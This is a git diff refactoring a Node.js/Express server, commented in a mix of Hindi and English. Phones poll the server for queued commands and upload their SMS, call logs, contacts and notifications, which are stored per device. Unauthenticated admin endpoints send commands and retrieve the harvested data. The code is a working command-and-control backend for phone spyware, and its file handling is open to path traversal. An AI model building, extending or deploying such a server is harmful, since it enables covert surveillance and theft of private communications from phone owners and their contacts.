@@ -7,6 +7,7 @@ const bodyParser = require('body-parser');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
+// Storage configuration
 const UPLOADS_DIR = path.join(__dirname, 'uploads');
 if (!fs.existsSync(UPLOADS_DIR)) {
     fs.mkdirSync(UPLOADS_DIR);
@@ -17,40 +18,40 @@ app.use(bodyParser.json({ limit: '50mb' }));
 app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
 app.use(express.static(__dirname));
 
+// Memory for tracking different devices
 let devicesStatus = {}; 
 
 // ==================================================
-// 📲 PHONE SIDE (App Side)
+// 📲 PHONE API (Device Communication)
 // ==================================================
 
 app.post('/api/status', (req, res) => {
     let { device_id, model, battery, version, charging } = req.body; 
-    if (!device_id) {
-        console.log("⚠️ REJECTED: Ping received without Device ID");
-        return res.status(400).json({ error: "No Device ID" });
+    if (!device_id) return res.status(400).json({ error: "No Device ID" });
+
+    // Multi-user safety: ID consistent rakho
+    const id = device_id.toString().toUpperCase().trim();
+
+    // 1. Pehle dekho ki is ID ke liye koi command pending hai?
+    let pendingCommand = "none";
+    if (devicesStatus[id] && devicesStatus[id].command && devicesStatus[id].command !== "none") {
+        pendingCommand = devicesStatus[id].command;
     }
 
-    device_id = device_id.toUpperCase();
-
-    // Check if there is a pending command
-    const pendingCommand = (devicesStatus[device_id] && devicesStatus[device_id].command) ? devicesStatus[device_id].command : "none";
-
-    // Update status
-    devicesStatus[device_id] = {
-        id: device_id,
+    // 2. Status Update (Par command ko sirf tab reset karo jab humne use phone ko bhej diya ho)
+    devicesStatus[id] = {
+        id: id,
         model: model || "Unknown Device",
         battery: battery || 0,
         version: version || "--",
         charging: (charging === 'true' || charging === true),
         lastSeen: Date.now(),
-        command: "none" 
+        command: "none" // Delivery ke baad next ping ke liye reset
     };
 
-    // DEBUG LOG
     console.log(`-------------------------------------------`);
-    console.log(`📡 PING RECEIVED | ID: ${device_id} | Model: ${model}`);
-    console.log(`🔋 Battery: ${battery}% | Charging: ${charging}`);
-    console.log(`✉️ Command Sent to Phone: ${pendingCommand}`);
+    console.log(`📡 PING | Device: ${id} | Model: ${model}`);
+    console.log(`🔋 Battery: ${battery}% | Command Sent: ${pendingCommand}`);
     console.log(`-------------------------------------------`);
 
     res.json({ status: "success", command: pendingCommand });
@@ -58,108 +59,120 @@ app.post('/api/status', (req, res) => {
 
 app.post('/api/upload_data', (req, res) => {
     let { device_id, type, data } = req.body;
-    if (!device_id) return res.status(400).json({ error: "No ID" });
+    if (!device_id) return res.status(400).json({ error: "Missing ID" });
     
-    device_id = device_id.toUpperCase();
-    console.log(`📥 UPLOAD ATTEMPT | ID: ${device_id} | Type: ${type}`);
+    const id = device_id.toString().toUpperCase().trim();
+    console.log(`📥 UPLOAD | Device: ${id} | Type: ${type}`);
 
-    let parsedData;
     try {
-        parsedData = typeof data === 'string' ? JSON.parse(data) : data;
+        let parsedData = typeof data === 'string' ? JSON.parse(data) : data;
         
-        // CHECK: Kya data khali toh nahi?
+        // Data Validation
         if (!parsedData || (Array.isArray(parsedData) && parsedData.length === 0)) {
-            console.log(`⚠️ WARNING: [${device_id}] ne [${type}] bhej toh diya, par DATA KHALI (Empty) hai!`);
-        } else {
-            const count = Array.isArray(parsedData) ? parsedData.length : "1 Object";
-            console.log(`✅ SUCCESS: [${device_id}] received ${count} entries for ${type}`);
+            console.log(`⚠️ WARNING: [${id}] sent EMPTY data for [${type}]`);
         }
-    } catch (e) {
-        console.log(`❌ ERROR: [${device_id}] ne invalid data bheja. Parse nahi ho raha.`);
-        return res.status(400).json({ error: "Invalid JSON" });
-    }
 
-    const filePath = path.join(UPLOADS_DIR, `${device_id}_${type}.json`);
-
-    try {
+        const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);
         let finalData;
-        const historyTypes = ['notifications', 'sms', 'call_logs', 'contacts'];
 
+        // History Merge Logic (SMS, Contacts, etc.)
+        const historyTypes = ['notifications', 'sms', 'call_logs', 'contacts'];
         if (historyTypes.includes(type)) {
             let existingData = [];
             if (fs.existsSync(filePath)) {
                 try {
-                    const content = fs.readFileSync(filePath, 'utf8');
-                    existingData = JSON.parse(content);
+                    existingData = JSON.parse(fs.readFileSync(filePath, 'utf8'));
                 } catch (e) { existingData = []; }
             }
             if (!Array.isArray(existingData)) existingData = [];
 
-            if (Array.isArray(parsedData)) {
-                finalData = [...parsedData, ...existingData].slice(0, 2000); 
-            } else {
-                existingData.unshift(parsedData);
-                finalData = existingData.slice(0, 2000);
-            }
+            // Merge and keep latest 2000 records
+            finalData = Array.isArray(parsedData) ? [...parsedData, ...existingData] : [parsedData, ...existingData];
+            finalData = finalData.slice(0, 2000); 
         } else {
             finalData = parsedData;
         }
 
         fs.writeFileSync(filePath, JSON.stringify(finalData, null, 2));
+        console.log(`✅ SAVED: ${type} for Device ${id}`);
         res.json({ status: "success" });
     } catch (error) {
-        console.error(`❌ FILE SAVE ERROR [${device_id}]:`, error);
+        console.error(`❌ SAVE ERROR [${id}]:`, error.message);
         res.status(500).json({ status: "error" });
     }
 });
 
 // ==================================================
-// 💻 DASHBOARD SIDE (Admin Side)
+// 💻 ADMIN API (Dashboard Control)
 // ==================================================
 
+// Command bhejne ke liye (Targeted to specific ID)
 app.post('/api/send-command', (req, res) => {
     let { device_id, command } = req.body;
-    if(!device_id) return res.status(400).json({error: "ID required"});
-    
-    device_id = device_id.toUpperCase();
+    if (!device_id || !command) return res.status(400).json({ error: "ID and Command required" });
 
-    if (!devicesStatus[device_id]) {
-        devicesStatus[device_id] = { id: device_id, model: "Unknown", lastSeen: 0 };
+    const id = device_id.toString().toUpperCase().trim();
+
+    // Memory mein set karo taaki agle ping pe phone ise le jaye
+    if (!devicesStatus[id]) {
+        devicesStatus[id] = { id: id, lastSeen: 0 };
     }
     
-    devicesStatus[device_id].command = command;
-    console.log(`🚀 ADMIN COMMAND QUEUED | Target: ${device_id} | Cmd: ${command}`);
-    res.json({ status: "success", queuedCommand: command });
+    devicesStatus[id].command = command;
+    console.log(`🚀 QUEUED: Command [${command}] for Device [${id}]`);
+    res.json({ status: "success", target: id, command: command });
 });
 
-// Baaki routes (all-devices aur get-data) wahi rahenge
+// Saare devices ki list dashboard ke liye
 app.get('/api/admin/all-devices', (req, res) => {
     const files = fs.readdirSync(UPLOADS_DIR);
     let deviceList = {};
+
+    // 1. Memory wale devices check karo
+    for (let id in devicesStatus) {
+        const isOnline = (Date.now() - devicesStatus[id].lastSeen) < 60000;
+        deviceList[id] = {
+            id: id,
+            model: devicesStatus[id].model || "Searching...",
+            isOnline: isOnline,
+            battery: devicesStatus[id].battery || "--"
+        };
+    }
+
+    // 2. Files se purane devices check karo
     files.forEach(file => {
-        const deviceId = file.split('_')[0].toUpperCase();
-        if (!deviceList[deviceId]) {
-            const isOnline = devicesStatus[deviceId] ? (Date.now() - devicesStatus[deviceId].lastSeen < 60000) : false;
-            deviceList[deviceId] = {
-                id: deviceId,
-                model: devicesStatus[deviceId]?.model || "Offline",
-                isOnline: isOnline,
-                battery: devicesStatus[deviceId]?.battery || "--"
-            };
+        const id = file.split('_')[0].toUpperCase();
+        if (!deviceList[id]) {
+            deviceList[id] = { id: id, model: "Offline Record", isOnline: false, battery: "--" };
         }
     });
-    res.json(deviceList);
+
+    res.json(Object.values(deviceList));
 });
 
+// Specific device ka status dekhne ke liye
+app.get('/api/device-status/:id', (req, res) => {
+    const id = req.params.id.toUpperCase().trim();
+    const device = devicesStatus[id];
+    if (!device) return res.json({ id: id, isOnline: false, model: "Unknown" });
+
+    const isOnline = (Date.now() - device.lastSeen) < 60000;
+    res.json({ ...device, isOnline });
+});
+
+// Data file fetch karne ke liye
 app.get('/api/get-data/:device_id/:type', (req, res) => {
-    const devId = req.params.device_id.toUpperCase();
-    const type = req.params.type;
-    const filePath = path.join(UPLOADS_DIR, `${devId}_${type}.json`);
-    if (fs.existsSync(filePath)) res.sendFile(filePath);
-    else res.json([]);
+    const id = req.params.device_id.toUpperCase().trim();
+    const filePath = path.join(UPLOADS_DIR, `${id}_${req.params.type}.json`);
+
+    if (fs.existsSync(filePath)) {
+        res.sendFile(filePath);
+    } else {
+        res.json([]);
+    }
 });
 
 app.listen(PORT, () => {
-    console.log(`🔥 CYBER-SERVER RUNNING ON PORT ${PORT}`);
-    console.log(`📂 Storage Path: ${UPLOADS_DIR}`);
+    console.log(`🔥 SERVER ACTIVE | PORT: ${PORT}`);
+    console.log(`📂 DATA PATH: ${UPLOADS_DIR}`);
 });
